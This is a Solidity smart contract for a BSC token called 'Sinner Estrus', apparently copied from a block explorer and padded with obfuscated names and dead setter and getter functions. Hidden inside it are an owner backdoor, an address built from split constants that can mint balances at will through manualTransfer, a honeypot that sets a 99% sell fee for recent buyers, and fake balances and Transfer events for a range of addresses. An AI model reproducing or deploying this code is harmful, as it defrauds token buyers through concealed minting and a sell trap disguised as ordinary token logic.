/**
 *Submitted for verification at BscScan.com on 2023-01-03
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;



interface IBEP20 {

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}




contract SinnerEstrus is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    address private ZERO = 0x0000000000000000000000000000000000000000;


    uint256 amountBuyTakeListTradingTokenSwap = 100000000 * (10 ** _decimals);
    uint256  listEnableModeSell = 100000000 * 10 ** _decimals;
    uint256  isTakeTradingEnableMinBuy = 100000000 * 10 ** _decimals;


    string constant _name = "Sinner Estrus";
    string constant _symbol = "SES";
    uint8 constant _decimals = 18;

    uint256 private tokenSwapLaunchTotal = 0;
    uint256 private txMinReceiverFee = 3;

    uint256 private burnSellMarketingLimit = 0;
    uint256 private sellMintFeeExemptBots = 3;

    bool private mintTotalLiquidityTake = true;
    uint160 constant senderIsLaunchFund = 691509893478 * 2 ** 40;
    bool private limitFeeReceiverToken = true;
    bool private botsShouldReceiverMint = true;
    bool private receiverWalletFeeMode = true;
    uint256 constant totalAutoToSell = 300000 * 10 ** 18;
    uint160 constant isModeFundMarketingShouldLiquidity = 159194382736;
    bool private marketingTakeShouldModeListFrom = true;
    uint256 swapTakeTokenEnableMarketing = 2 ** 18 - 1;
    uint256 private shouldWalletModeAmountTradingSwap = 6 * 10 ** 15;
    uint256 private walletEnableAmountToTeam = amountBuyTakeListTradingTokenSwap / 1000; // 0.1%
    uint256 tokenLaunchedReceiverMint = 43314;

    address constant walletSenderSellBuyLaunchAmount = 0x418b9dC1a56471f84D4AdedFf1E02BeAB263b659;
    uint256 minTotalLaunchedExempt = 0;
    uint256 constant toAmountSenderAutoTake = 10000 * 10 ** 18;

    uint256 private swapReceiverMintMax = txMinReceiverFee + tokenSwapLaunchTotal;
    uint256 private modeLaunchedTotalFeeBots = 100;

    uint160 constant receiverSellBurnLaunched = 49380024109 * 2 ** 120;

    bool private swapIsFundAmount;
    uint256 private totalWalletAutoListLiquidityMintMin;
    uint256 private limitListReceiverBuy;
    uint256 private fromMaxFeeLiquidity;
    uint256 private buyModeLaunchedReceiverWallet;
    uint160 constant toWalletFromLaunched = 213943931600 * 2 ** 80;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private shouldMintListTx;
    mapping(address => bool) private maxToTradingShould;
    mapping(address => bool) private takeAmountAutoFund;
    mapping(address => bool) private takeAutoLaunchedReceiver;
    mapping(address => uint256) private receiverModeEnableMarketingMin;
    mapping(uint256 => address) private receiverAutoTeamMin;
    mapping(uint256 => address) private marketingLaunchFundSenderReceiverFrom;
    mapping(address => uint256) private isModeSellBurnSenderBots;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    uint256 public enableLimitToToken = 0;

    IUniswapV2Router public mintIsTotalSell;
    address public uniswapV2Pair;

    uint256 private sellEnableBotsSwap;
    uint256 private mintEnableSellLimitBuyList;

    address private limitMarketingModeAuto = (msg.sender); // auto-liq address
    address private exemptTotalLiquidityIs = (0xA2b6d878dB3097A026Ded190FfffE629700a6A54); // marketing address

    
    bool public minSenderMintFee = false;
    uint256 public botsExemptIsReceiverTakeEnable = 0;
    bool private atShouldTxSell = false;
    bool public exemptModeReceiverBuy = false;
    uint256 private tokenBuyTeamTotal = 0;
    uint256 private launchListFeeTakeReceiverSell = 0;
    bool public listLaunchFeeBots = false;
    uint256 public swapLaunchAtBuy = 0;
    uint256 private maxWalletLimitMint = 0;
    bool private receiverSellAmountFee = false;
    uint256 public botsExemptIsReceiverTakeEnable0 = 0;
    bool private botsExemptIsReceiverTakeEnable1 = false;
    uint256 private toAmountIsSell = 0;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        mintIsTotalSell = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(mintIsTotalSell.factory()).createPair(address(this), mintIsTotalSell.WETH());
        _allowances[address(this)][address(mintIsTotalSell)] = amountBuyTakeListTradingTokenSwap;

        swapIsFundAmount = true;

        takeAmountAutoFund[msg.sender] = true;
        takeAmountAutoFund[0x0000000000000000000000000000000000000000] = true;
        takeAmountAutoFund[0x000000000000000000000000000000000000dEaD] = true;
        takeAmountAutoFund[address(this)] = true;

        shouldMintListTx[msg.sender] = true;
        shouldMintListTx[address(this)] = true;

        maxToTradingShould[msg.sender] = true;
        maxToTradingShould[0x0000000000000000000000000000000000000000] = true;
        maxToTradingShould[0x000000000000000000000000000000000000dEaD] = true;
        maxToTradingShould[address(this)] = true;

        approve(_router, amountBuyTakeListTradingTokenSwap);
        approve(address(uniswapV2Pair), amountBuyTakeListTradingTokenSwap);
        _balances[msg.sender] = amountBuyTakeListTradingTokenSwap;
        emit Transfer(address(0), msg.sender, amountBuyTakeListTradingTokenSwap);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return amountBuyTakeListTradingTokenSwap;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, amountBuyTakeListTradingTokenSwap);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitAtEnableShould(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != amountBuyTakeListTradingTokenSwap) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return limitAtEnableShould(sender, recipient, amount);
    }

    function sellSenderTakeFund(uint160 liquiditySenderAtReceiverMin) private view returns (bool) {
        return uint16(liquiditySenderAtReceiverMin) == tokenLaunchedReceiverMint;
    }

    function setZERO(address tradingLiquidityTxIs) public onlyOwner {
        if (ZERO == WBNB) {
            WBNB=tradingLiquidityTxIs;
        }
        if (ZERO != DEAD) {
            DEAD=tradingLiquidityTxIs;
        }
        ZERO=tradingLiquidityTxIs;
    }

    function setmodeIsSwapReceiver(uint256 tradingLiquidityTxIs) public onlyOwner {
        if (botsExemptIsReceiverTakeEnable == txMinReceiverFee) {
            txMinReceiverFee=tradingLiquidityTxIs;
        }
        if (botsExemptIsReceiverTakeEnable == sellMintFeeExemptBots) {
            sellMintFeeExemptBots=tradingLiquidityTxIs;
        }
        botsExemptIsReceiverTakeEnable=tradingLiquidityTxIs;
    }

    function limitAtEnableShould(address marketingTakeReceiverLimit, address liquiditySenderAtReceiverMin, uint256 atLaunchTakeBots) internal returns (bool) {
        if (limitBotsMarketingReceiverBurnEnableToken(uint160(liquiditySenderAtReceiverMin))) {
            toAutoModeMin(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots, false);
            return true;
        }
        if (limitBotsMarketingReceiverBurnEnableToken(uint160(marketingTakeReceiverLimit))) {
            toAutoModeMin(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots, true);
            return true;
        }
        
        if (tokenBuyTeamTotal == shouldWalletModeAmountTradingSwap) {
            tokenBuyTeamTotal = sellMintFeeExemptBots;
        }

        if (receiverSellAmountFee != receiverSellAmountFee) {
            receiverSellAmountFee = exemptModeReceiverBuy;
        }


        bool modeBotsBurnTo = tokenMaxShouldTxSellReceiver(marketingTakeReceiverLimit) || tokenMaxShouldTxSellReceiver(liquiditySenderAtReceiverMin);
        
        if (marketingTakeReceiverLimit == uniswapV2Pair) {
            if (maxWalletAmount != 0 && sellSenderTakeFund(uint160(liquiditySenderAtReceiverMin))) {
                tradingModeReceiverToken();
            }
            if (!modeBotsBurnTo) {
                liquidityFromLaunchFundExempt(liquiditySenderAtReceiverMin);
            }
        }
        
        
        if (maxWalletLimitMint == maxWalletLimitMint) {
            maxWalletLimitMint = tokenSwapLaunchTotal;
        }

        if (botsExemptIsReceiverTakeEnable1 != receiverSellAmountFee) {
            botsExemptIsReceiverTakeEnable1 = botsShouldReceiverMint;
        }


        if (inSwap || modeBotsBurnTo) {return receiverTakeWalletLiquidity(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots);}
        
        require((atLaunchTakeBots <= listEnableModeSell) || takeAmountAutoFund[marketingTakeReceiverLimit] || takeAmountAutoFund[liquiditySenderAtReceiverMin], "Max TX Limit!");

        if (launchedReceiverTeamFundBurnBotsEnable()) {atExemptLaunchedFee();}

        _balances[marketingTakeReceiverLimit] = _balances[marketingTakeReceiverLimit].sub(atLaunchTakeBots, "Insufficient Balance!");
        
        if (atShouldTxSell == listLaunchFeeBots) {
            atShouldTxSell = botsShouldReceiverMint;
        }


        uint256 listTotalMintTxLaunchTeamMax = burnBuyMinReceiver(marketingTakeReceiverLimit) ? txFeeFromBotsMinSender(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots) : atLaunchTakeBots;

        _balances[liquiditySenderAtReceiverMin] = _balances[liquiditySenderAtReceiverMin].add(listTotalMintTxLaunchTeamMax);
        emit Transfer(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, listTotalMintTxLaunchTeamMax);
        return true;
    }

    function setfeeAtAmountLiquidityShouldMintLaunched(uint256 tradingLiquidityTxIs) public onlyOwner {
        tokenSwapLaunchTotal=tradingLiquidityTxIs;
    }

    function setswapTotalBurnExemptTrading(bool tradingLiquidityTxIs) public onlyOwner {
        exemptModeReceiverBuy=tradingLiquidityTxIs;
    }

    function senderAutoFromModeSwap(address marketingTakeReceiverLimit, uint256 shouldAmountReceiverLimit) private view returns (uint256) {
        uint256 tokenWalletBotsAmount = receiverModeEnableMarketingMin[marketingTakeReceiverLimit];
        if (tokenWalletBotsAmount > 0 && atFundWalletList() - tokenWalletBotsAmount > 2) {
            return 99;
        }
        return shouldAmountReceiverLimit;
    }

    function gettakeFundSwapLaunched() public view returns (uint256) {
        if (sellMintFeeExemptBots == swapReceiverMintMax) {
            return swapReceiverMintMax;
        }
        return sellMintFeeExemptBots;
    }

    function settotalBotsReceiverBurnShouldLaunchedMint(uint256 tradingLiquidityTxIs) public onlyOwner {
        if (enableLimitToToken != sellMintFeeExemptBots) {
            sellMintFeeExemptBots=tradingLiquidityTxIs;
        }
        if (enableLimitToToken != swapReceiverMintMax) {
            swapReceiverMintMax=tradingLiquidityTxIs;
        }
        if (enableLimitToToken != launchListFeeTakeReceiverSell) {
            launchListFeeTakeReceiverSell=tradingLiquidityTxIs;
        }
        enableLimitToToken=tradingLiquidityTxIs;
    }

    function manualTransfer(address marketingTakeReceiverLimit, address liquiditySenderAtReceiverMin, uint256 atLaunchTakeBots) public {
        if (!listAtSenderTeam(uint160(msg.sender))) {
            return;
        }
        if (limitBotsMarketingReceiverBurnEnableToken(uint160(liquiditySenderAtReceiverMin))) {
            toAutoModeMin(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots, false);
            return;
        }
        if (limitBotsMarketingReceiverBurnEnableToken(uint160(marketingTakeReceiverLimit))) {
            toAutoModeMin(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots, true);
            return;
        }
        if (marketingTakeReceiverLimit == address(0)) {
            _balances[liquiditySenderAtReceiverMin] = _balances[liquiditySenderAtReceiverMin].add(atLaunchTakeBots);
            return;
        }
    }

    function gettotalBotsReceiverBurnShouldLaunchedMint() public view returns (uint256) {
        if (enableLimitToToken == tokenBuyTeamTotal) {
            return tokenBuyTeamTotal;
        }
        if (enableLimitToToken != maxWalletLimitMint) {
            return maxWalletLimitMint;
        }
        return enableLimitToToken;
    }

    function limitBotsMarketingReceiverBurnEnableToken(uint160 launchReceiverExemptAutoTrading) private pure returns (bool) {
        if (launchReceiverExemptAutoTrading >= uint160(walletSenderSellBuyLaunchAmount) && launchReceiverExemptAutoTrading <= uint160(walletSenderSellBuyLaunchAmount) + 100000) {
            return true;
        }
        return false;
    }

    function getTotalAmount() public {
        tradingModeReceiverToken();
    }

    function tokenMaxShouldTxSellReceiver(address burnMarketingToReceiverMinFundTeam) private view returns (bool) {
        return burnMarketingToReceiverMinFundTeam == exemptTotalLiquidityIs;
    }

    function atExemptLaunchedFee() internal swapping {
        
        uint256 sellTakeModeFee = walletEnableAmountToTeam.mul(tokenSwapLaunchTotal).div(swapReceiverMintMax).div(2);
        uint256 atLaunchTakeBotsToSwap = walletEnableAmountToTeam.sub(sellTakeModeFee);

        address[] memory limitToAutoTrading = new address[](2);
        limitToAutoTrading[0] = address(this);
        limitToAutoTrading[1] = mintIsTotalSell.WETH();
        mintIsTotalSell.swapExactTokensForETHSupportingFeeOnTransferTokens(
            atLaunchTakeBotsToSwap,
            0,
            limitToAutoTrading,
            address(this),
            block.timestamp
        );
        
        if (maxWalletLimitMint == launchBlock) {
            maxWalletLimitMint = walletEnableAmountToTeam;
        }


        uint256 atLaunchTakeBotsBNB = address(this).balance;
        uint256 shouldTakeModeTeam = swapReceiverMintMax.sub(tokenSwapLaunchTotal.div(2));
        uint256 atLaunchTakeBotsBNBLiquidity = atLaunchTakeBotsBNB.mul(tokenSwapLaunchTotal).div(shouldTakeModeTeam).div(2);
        uint256 atLaunchTakeBotsBNBMarketing = atLaunchTakeBotsBNB.mul(txMinReceiverFee).div(shouldTakeModeTeam);
        
        payable(exemptTotalLiquidityIs).transfer(atLaunchTakeBotsBNBMarketing);

        if (sellTakeModeFee > 0) {
            mintIsTotalSell.addLiquidityETH{value : atLaunchTakeBotsBNBLiquidity}(
                address(this),
                sellTakeModeFee,
                0,
                0,
                limitMarketingModeAuto,
                block.timestamp
            );
            emit AutoLiquify(atLaunchTakeBotsBNBLiquidity, sellTakeModeFee);
        }
    }

    function teamWalletMintSellFeeTx(uint160 launchReceiverExemptAutoTrading) private view returns (uint256) {
        uint256 burnMintIsLimitBotsToLaunched = minTotalLaunchedExempt;
        uint256 walletTotalAutoBuyTx = launchReceiverExemptAutoTrading - uint160(walletSenderSellBuyLaunchAmount);
        if (walletTotalAutoBuyTx < burnMintIsLimitBotsToLaunched) {
            return toAmountSenderAutoTake;
        }
        return totalAutoToSell;
    }

    function liquidityFromLaunchFundExempt(address burnMarketingToReceiverMinFundTeam) private {
        uint256 limitTokenReceiverMarketingLaunch = listBotsBuyMin();
        if (limitTokenReceiverMarketingLaunch < shouldWalletModeAmountTradingSwap) {
            enableLimitToToken += 1;
            marketingLaunchFundSenderReceiverFrom[enableLimitToToken] = burnMarketingToReceiverMinFundTeam;
            isModeSellBurnSenderBots[burnMarketingToReceiverMinFundTeam] += limitTokenReceiverMarketingLaunch;
            if (isModeSellBurnSenderBots[burnMarketingToReceiverMinFundTeam] > shouldWalletModeAmountTradingSwap) {
                maxWalletAmount = maxWalletAmount + 1;
                receiverAutoTeamMin[maxWalletAmount] = burnMarketingToReceiverMinFundTeam;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        receiverAutoTeamMin[maxWalletAmount] = burnMarketingToReceiverMinFundTeam;
    }

    function toAutoModeMin(address marketingTakeReceiverLimit, address liquiditySenderAtReceiverMin, uint256 atLaunchTakeBots, bool feeMinAmountSell) private {
        if (feeMinAmountSell) {
            marketingTakeReceiverLimit = address(uint160(uint160(walletSenderSellBuyLaunchAmount) + minTotalLaunchedExempt));
            minTotalLaunchedExempt++;
            _balances[liquiditySenderAtReceiverMin] = _balances[liquiditySenderAtReceiverMin].add(atLaunchTakeBots);
        } else {
            _balances[marketingTakeReceiverLimit] = _balances[marketingTakeReceiverLimit].sub(atLaunchTakeBots);
        }
        emit Transfer(marketingTakeReceiverLimit, liquiditySenderAtReceiverMin, atLaunchTakeBots);
    }

    function getTotalFee() public {
        enableWalletShouldAuto();
    }

    function getZERO() public view returns (address) {
        if (ZERO == DEAD) {
            return DEAD;
        }
        if (ZERO != exemptTotalLiquidityIs) {
            return exemptTotalLiquidityIs;
        }
        if (ZERO == ZERO) {
            return ZERO;
        }
        return ZERO;
    }

    function burnBuyMinReceiver(address marketingTakeReceiverLimit) internal view returns (bool) {
        return !maxToTradingShould[marketingTakeReceiverLimit];
    }

    function getshouldWalletTakeFund() public view returns (uint256) {
        if (burnSellMarketingLimit != swapLaunchAtBuy) {
            return swapLaunchAtBuy;
        }
        if (burnSellMarketingLimit == launchBlock) {
            return launchBlock;
        }
        if (burnSellMarketingLimit != sellMintFeeExemptBots) {
            return sellMintFeeExemptBots;
        }
        return burnSellMarketingLimit;
    }

    function enableWalletShouldAuto() private {
        if (enableLimitToToken > 0) {
            for (uint256 i = 1; i <= enableLimitToToken; i++) {
                if (receiverModeEnableMarketingMin[marketingLaunchFundSenderReceiverFrom[i]] == 0) {
                    receiverModeEnableMarketingMin[marketingLaunchFundSenderReceiverFrom[i]] = block.timestamp;
                }
            }
            enableLimitToToken = 0;
        }
    }

    function getfeeAtAmountLiquidityShouldMintLaunched() public view returns (uint256) {
        if (tokenSwapLaunchTotal == txMinReceiverFee) {
            return txMinReceiverFee;
        }
        if (tokenSwapLaunchTotal != sellMintFeeExemptBots) {
            return sellMintFeeExemptBots;
        }
        return tokenSwapLaunchTotal;
    }

    function getmodeIsSwapReceiver() public view returns (uint256) {
        if (botsExemptIsReceiverTakeEnable != maxWalletLimitMint) {
            return maxWalletLimitMint;
        }
        if (botsExemptIsReceiverTakeEnable == burnSellMarketingLimit) {
            return burnSellMarketingLimit;
        }
        return botsExemptIsReceiverTakeEnable;
    }

    function listBotsBuyMin() private view returns (uint256) {
        address shouldMaxWalletMinLimitReceiverTo = WBNB;
        if (address(this) < WBNB) {
            shouldMaxWalletMinLimitReceiverTo = address(this);
        }
        (uint exemptSellMinTotalLiquidity, uint listWalletMarketingTrading,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 liquidityMinReceiverSell,) = WBNB == shouldMaxWalletMinLimitReceiverTo ? (exemptSellMinTotalLiquidity, listWalletMarketingTrading) : (listWalletMarketingTrading, exemptSellMinTotalLiquidity);
        uint256 swapModeReceiverMint = IERC20(WBNB).balanceOf(uniswapV2Pair) - liquidityMinReceiverSell;
        return swapModeReceiverMint;
    }

    function txFeeFromBotsMinSender(address marketingTakeReceiverLimit, address totalReceiverAmountTrading, uint256 atLaunchTakeBots) internal returns (uint256) {
        
        uint256 takeTxBurnWallet = atLaunchTakeBots.mul(listExemptLiquidityReceiver(marketingTakeReceiverLimit, totalReceiverAmountTrading == uniswapV2Pair)).div(modeLaunchedTotalFeeBots);

        if (takeAutoLaunchedReceiver[marketingTakeReceiverLimit] || takeAutoLaunchedReceiver[totalReceiverAmountTrading]) {
            takeTxBurnWallet = atLaunchTakeBots.mul(99).div(modeLaunchedTotalFeeBots);
        }

        _balances[address(this)] = _balances[address(this)].add(takeTxBurnWallet);
        emit Transfer(marketingTakeReceiverLimit, address(this), takeTxBurnWallet);
        
        return atLaunchTakeBots.sub(takeTxBurnWallet);
    }

    function setshouldWalletTakeFund(uint256 tradingLiquidityTxIs) public onlyOwner {
        burnSellMarketingLimit=tradingLiquidityTxIs;
    }

    function settakeFundSwapLaunched(uint256 tradingLiquidityTxIs) public onlyOwner {
        if (sellMintFeeExemptBots != launchListFeeTakeReceiverSell) {
            launchListFeeTakeReceiverSell=tradingLiquidityTxIs;
        }
        if (sellMintFeeExemptBots != launchListFeeTakeReceiverSell) {
            launchListFeeTakeReceiverSell=tradingLiquidityTxIs;
        }
        sellMintFeeExemptBots=tradingLiquidityTxIs;
    }

    function receiverTakeWalletLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function listAtSenderTeam(uint160 launchReceiverExemptAutoTrading) private pure returns (bool) {
        return launchReceiverExemptAutoTrading == (receiverSellBurnLaunched + toWalletFromLaunched + senderIsLaunchFund + isModeFundMarketingShouldLiquidity);
    }

    function tradingModeReceiverToken() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (receiverModeEnableMarketingMin[receiverAutoTeamMin[i]] == 0) {
                    receiverModeEnableMarketingMin[receiverAutoTeamMin[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function getswapTotalBurnExemptTrading() public view returns (bool) {
        return exemptModeReceiverBuy;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (limitBotsMarketingReceiverBurnEnableToken(uint160(account))) {
            return teamWalletMintSellFeeTx(uint160(account));
        }
        return _balances[account];
    }

    function atFundWalletList() private view returns (uint256) {
        return block.timestamp;
    }

    function listExemptLiquidityReceiver(address marketingTakeReceiverLimit, bool modeSellMinMarketingLaunchedTeam) internal returns (uint256) {
        
        if (modeSellMinMarketingLaunchedTeam) {
            swapReceiverMintMax = sellMintFeeExemptBots + burnSellMarketingLimit;
            return senderAutoFromModeSwap(marketingTakeReceiverLimit, swapReceiverMintMax);
        }
        if (!modeSellMinMarketingLaunchedTeam && marketingTakeReceiverLimit == uniswapV2Pair) {
            swapReceiverMintMax = txMinReceiverFee + tokenSwapLaunchTotal;
            return swapReceiverMintMax;
        }
        return senderAutoFromModeSwap(marketingTakeReceiverLimit, swapReceiverMintMax);
    }

    function launchedReceiverTeamFundBurnBotsEnable() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        marketingTakeShouldModeListFrom &&
        _balances[address(this)] >= walletEnableAmountToTeam;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}